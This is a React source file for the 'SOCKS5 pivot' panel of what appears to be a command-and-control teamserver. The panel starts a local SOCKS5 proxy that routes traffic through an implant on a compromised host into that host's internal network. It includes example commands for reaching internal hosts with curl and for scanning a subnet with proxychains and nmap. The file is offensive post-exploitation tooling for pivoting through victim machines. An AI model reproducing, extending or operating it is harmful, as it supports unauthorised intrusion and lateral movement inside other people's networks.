import React, { useCallback, useEffect, useState } from 'react';
import styled from 'styled-components';
import axios from 'axios';
import { toast } from 'react-toastify';
import { FiCopy, FiPlay, FiSquare, FiRefreshCw } from 'react-icons/fi';

const Wrap = styled.div`
  display: flex;
  flex-direction: column;
  gap: 20px;
  padding: 4px 2px 20px;
  overflow: auto;
`;

const Title = styled.h3`
  margin: 0;
  font-family: 'Syne', system-ui, sans-serif;
  font-size: 20px;
  font-weight: 700;
  color: #eef1f6;
  letter-spacing: -0.02em;
`;

const Blurb = styled.p`
  margin: 0;
  color: #8b93a7;
  font-size: 13px;
  line-height: 1.5;
  max-width: 640px;
`;

const Card = styled.div`
  background: #161a22;
  border: 1px solid #2a3140;
  border-radius: 10px;
  padding: 16px 18px;
  max-width: 560px;
`;

const Row = styled.div`
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  align-items: center;
  margin-top: 14px;
`;

const Label = styled.label`
  display: flex;
  flex-direction: column;
  gap: 6px;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.08em;
  text-transform: uppercase;
  color: #8b93a7;
`;

const Input = styled.input`
  background: #12151c;
  border: 1px solid #2a3140;
  color: #eef1f6;
  border-radius: 8px;
  padding: 9px 12px;
  font-size: 14px;
  width: 120px;
  font-family: inherit;
  outline: none;
  &:focus { border-color: #c6f23e; }
`;

const Btn = styled.button`
  background: ${p => (p.$danger ? 'transparent' : '#c6f23e')};
  color: ${p => (p.$danger ? '#ff6b7a' : '#12151c')};
  border: 1px solid ${p => (p.$danger ? 'rgba(255,107,122,0.45)' : '#c6f23e')};
  border-radius: 8px;
  padding: 10px 14px;
  font-size: 13px;
  font-weight: 600;
  font-family: inherit;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 8px;
  &:disabled { opacity: 0.5; cursor: not-allowed; }
  &:hover:not(:disabled) {
    filter: brightness(1.05);
  }
`;

const Ghost = styled(Btn)`
  background: transparent;
  color: #aeb6c7;
  border-color: #2a3140;
`;

const Status = styled.div`
  margin-top: 14px;
  font-size: 13px;
  color: #aeb6c7;
  code {
    color: #c6f23e;
    font-size: 13px;
  }
`;

const Examples = styled.pre`
  margin: 0;
  background: #12151c;
  border: 1px solid #2a3140;
  border-radius: 8px;
  padding: 12px 14px;
  color: #8b93a7;
  font-size: 12px;
  line-height: 1.55;
  overflow-x: auto;
`;

const authHeaders = () => ({
  Authorization: `Bearer ${localStorage.getItem('fahis_token') || localStorage.getItem('c2_token') || ''}`,
});

const SocksPanel = ({ client, socket }) => {
  const [port, setPort] = useState(1080);
  const [busy, setBusy] = useState(false);
  const [status, setStatus] = useState({ active: false });

  const applyStatus = useCallback((data) => {
    if (!data || (data.clientId && data.clientId !== client?.id)) return;
    setStatus({
      active: !!data.active,
      host: data.host || '127.0.0.1',
      port: data.port,
      tunnels: data.tunnels || 0,
      error: data.error,
    });
    if (data.error) toast.error(data.error);
  }, [client?.id]);

  const refresh = useCallback(async () => {
    if (!client?.id) return;
    try {
      const res = await axios.get(`/api/socks/${client.id}`, { headers: authHeaders() });
      setStatus(res.data || { active: false });
    } catch {
      setStatus({ active: false });
    }
  }, [client?.id]);

  useEffect(() => {
    refresh();
    if (!socket) return undefined;
    const onStatus = (data) => applyStatus(data);
    socket.on('socksStatus', onStatus);
    socket.emit('getSocksStatus', { clientId: client.id });
    return () => socket.off('socksStatus', onStatus);
  }, [socket, client?.id, refresh, applyStatus]);

  const start = async () => {
    if (!client?.active) {
      toast.error('Session offline');
      return;
    }
    setBusy(true);
    try {
      const res = await axios.post(
        '/api/socks/start',
        { clientId: client.id, port: Number(port) || 0 },
        { headers: authHeaders() }
      );
      setStatus({ active: true, host: res.data.host, port: res.data.port, tunnels: 0 });
      toast.success(`SOCKS5 on ${res.data.host}:${res.data.port}`);
    } catch (e) {
      toast.error(e.response?.data?.error || e.message || 'Start failed');
    } finally {
      setBusy(false);
    }
  };

  const stop = async () => {
    setBusy(true);
    try {
      await axios.post('/api/socks/stop', { clientId: client.id }, { headers: authHeaders() });
      setStatus({ active: false });
      toast.info('SOCKS5 stopped');
    } catch (e) {
      toast.error(e.response?.data?.error || e.message || 'Stop failed');
    } finally {
      setBusy(false);
    }
  };

  const endpoint = status.active && status.port
    ? `${status.host || '127.0.0.1'}:${status.port}`
    : '';

  const copy = async () => {
    if (!endpoint) return;
    try {
      await navigator.clipboard.writeText(endpoint);
      toast.success('Copied');
    } catch {
      toast.error('Copy failed');
    }
  };

  return (
    <Wrap>
      <div>
        <Title>SOCKS5 pivot</Title>
        <Blurb>
          Exposes a local SOCKS5 proxy on this teamserver. Traffic is multiplexed over the
          C2 channel through <strong>{client?.hostname || 'this session'}</strong> into the
          remote network. Requires a current implant build with SOCKS support.
        </Blurb>
      </div>

      <Card>
        <Label>
          Listen port (0 = auto)
          <Input
            type="number"
            min={0}
            max={65535}
            value={port}
            onChange={(e) => setPort(e.target.value)}
            disabled={status.active || busy}
          />
        </Label>

        <Row>
          {!status.active ? (
            <Btn type="button" onClick={start} disabled={busy || !client?.active}>
              <FiPlay size={14} /> Start SOCKS5
            </Btn>
          ) : (
            <Btn type="button" $danger onClick={stop} disabled={busy}>
              <FiSquare size={14} /> Stop
            </Btn>
          )}
          <Ghost type="button" onClick={refresh} disabled={busy}>
            <FiRefreshCw size={14} /> Refresh
          </Ghost>
          {endpoint && (
            <Ghost type="button" onClick={copy}>
              <FiCopy size={14} /> Copy endpoint
            </Ghost>
          )}
        </Row>

        <Status>
          {status.active ? (
            <>
              Listening on <code>{endpoint}</code>
              {status.tunnels != null ? ` · ${status.tunnels} tunnel(s)` : ''}
            </>
          ) : (
            'Proxy is stopped'
          )}
        </Status>
      </Card>

      <div>
        <Blurb style={{ marginBottom: 8 }}>Examples (run on the teamserver machine)</Blurb>
        <Examples>{`curl --socks5 127.0.0.1:${status.port || 1080} http://internal-host/
proxychains nmap -sT -Pn 10.10.10.0/24
# browser: SOCKS5 host 127.0.0.1 port ${status.port || 1080}`}</Examples>
      </div>
    </Wrap>
  );
};

export default SocksPanel;
